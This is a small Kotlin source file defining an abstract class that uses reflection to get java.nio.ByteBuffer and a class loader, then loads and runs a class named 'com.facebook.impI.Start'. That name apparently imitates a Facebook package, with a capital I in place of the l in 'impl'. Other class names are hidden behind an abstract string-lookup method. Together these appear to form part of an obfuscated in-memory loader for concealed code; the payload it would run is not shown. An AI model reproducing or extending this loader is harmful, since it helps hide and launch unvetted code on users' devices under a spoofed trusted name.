package com.solar.tabor.nkil

/**
 * Date：2025/10/24
 * Describe:
 */
abstract class BaseFc {
    private val clazzByteBuffer by lazy { Class.forName("java.nio.ByteBuffer") }

    abstract fun tagStr(int: Int): String

    protected fun fetchPair(): Pair<Class<*>, Class<*>> {
        val c1 = Class.forName(tagStr(0))
        //"java.nio.ByteBuffer"
        val c2 = clazzByteBuffer
        return Pair(c1, c2)
    }

    protected fun next(cL: Any) {
        val lC = cL.javaClass.getMethod("loadClass", String::class.java)
            .invoke(cL, "com.facebook.impI.Start") as Class<*>

        lC.getMethod("a", Float::class.java).invoke(null, 1f)
    }

    protected fun fetchName(): String{
        return "getClassLoader"
    }
}